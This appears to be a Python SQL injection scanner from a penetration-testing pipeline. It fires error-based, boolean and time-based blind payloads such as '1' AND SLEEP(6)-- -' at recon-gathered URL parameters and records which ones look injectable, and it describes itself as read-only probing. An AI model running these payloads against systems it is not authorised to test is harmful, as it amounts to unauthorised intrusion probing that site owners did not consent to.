# -*- coding: utf-8 -*-
"""hunt-sqli hunt 阶段：对参数按 错误型→布尔型→时间型 递进判活。

只做只读证明：错误签名、布尔响应差异、时间盲注时延。不写库、不 dump 真实数据。
时间盲注取中位时延排抖动。NoSQL 的 JSON body 注入建议人工按 reference 做。

用法:
  python hunt_sqli.py --input recon/endpoints.json --output candidates.json [--delay 6] [--dry-run]
"""
import argparse
import os
import re
import statistics
import subprocess
import sys
from urllib.parse import quote

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import log, load_json, save_json, http_probe  # noqa: E402

ERR_SIGS = re.compile(
    r"SQL syntax|mysql_fetch|ORA-\d+|PG::|PostgreSQL.*ERROR|SQLSTATE|"
    r"SQLite3::|Microsoft OLE DB|ODBC SQL|Unclosed quotation|"
    r"you have an error in your sql", re.I)


def build(ep, value):
    base, param = ep.get("url"), ep.get("param")
    if not param or str(param).startswith("<"):
        return None
    sep = "&" if "?" in base else "?"
    return "%s%s%s=%s" % (base, sep, param, quote(value, safe=""))


def body(url, max_time=12):
    try:
        p = subprocess.run(["curl", "-sS", "--max-time", str(max_time), url],
                           capture_output=True, text=True, timeout=max_time + 3)
        return p.stdout or ""
    except Exception as e:
        return "ERR:%s" % e


def timed(url, repeat, max_time):
    ts = []
    for _ in range(repeat):
        r = http_probe(url, max_time=max_time)
        ts.append(float(r["time"]) if r["time"] else 0.0)
    return statistics.median(ts) if ts else 0.0


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--input", required=True)
    ap.add_argument("--output", required=True)
    ap.add_argument("--delay", type=int, default=6)
    ap.add_argument("--repeat", type=int, default=3)
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--max-time", type=int, default=15)
    args = ap.parse_args()

    data = load_json(args.input)
    if not data:
        sys.exit("读不到 %s，先跑 recon.sh" % args.input)
    eps = [e for e in data.get("endpoints", []) if e.get("controllable")]
    d = args.delay
    cands = []
    for ep in eps:
        if not build(ep, "x"):
            continue
        if args.dry_run:
            print("[dry-run] param=%s 将试 错误/布尔/时间(sleep%d)" % (ep.get("param"), d)); continue
        sig, suspected, kind = [], False, None
        # ① 错误型
        errbody = body(build(ep, "1'\""), args.max_time)
        if ERR_SIGS.search(errbody):
            sig.append("SQL 报错签名命中"); suspected = True; kind = "error"
        # ② 布尔型
        b_true = body(build(ep, "1' AND '1'='1"), args.max_time)
        b_false = body(build(ep, "1' AND '1'='2"), args.max_time)
        if b_true != b_false and abs(len(b_true) - len(b_false)) > 30 and "ERR:" not in b_true:
            sig.append("布尔响应差异(len %d vs %d)" % (len(b_true), len(b_false)))
            suspected = True; kind = kind or "boolean"
        # ③ 时间型
        base_med = timed(build(ep, "1"), args.repeat, args.max_time)
        sleep_med = timed(build(ep, "1' AND SLEEP(%d)-- -" % d), args.repeat, args.max_time)
        if sleep_med >= base_med + d - 2:
            sig.append("时间盲注(基线%.2fs→%.2fs, sleep%d)" % (base_med, sleep_med, d))
            suspected = True; kind = kind or "time"
        cands.append({"endpoint": ep.get("url"), "param": ep.get("param"),
                      "kind": kind, "signal": sig or ["无明显信号"],
                      "suspected": suspected,
                      "probe_url": build(ep, "1' AND SLEEP(%d)-- -" % d)})
    if args.dry_run:
        return
    save_json(args.output, {"target": data.get("target"), "candidates": cands})
    log("SQLi 候选 %d（%d 疑似注入）-> %s（NoSQL/JSON body 请按 reference 人工试）"
        % (len(cands), sum(1 for c in cands if c["suspected"]), args.output))


if __name__ == "__main__":
    main()
